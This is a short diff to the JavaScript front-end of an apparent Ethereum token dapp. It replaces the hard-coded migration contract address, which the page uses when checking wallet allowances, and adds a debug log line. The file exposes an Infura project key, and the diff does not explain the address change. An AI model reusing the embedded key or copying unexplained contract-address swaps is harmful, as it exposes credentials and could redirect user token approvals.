@@ -16,7 +16,7 @@ const web3 = new Web3(
   "https://mainnet.infura.io/v3/b888190dbba14ddbb66162628cf0e555"
 );
 const contractAddress = "0xa83055eaa689E477e7b2173eD7E3b55654b3A1f0";
-const migrationContractAddress = "0x9322915b1790a55897b4f6Fe52Bd66382Fed027d";
+const migrationContractAddress = "0x713Cf7b5bCc50aB9260e3aDaabD13201579C3117";
 
 const ethereum = window.ethereum;
 if (ethereum) {
@@ -115,6 +115,7 @@ export const Stats = () => {
       } catch {}
 
       if (wallet.length > 0) {
+        console.log("wlecome address");
         pullBalance(address);
         await pullAllowance(wallet, migrationContractAddress);
         console.log(claimDividends);
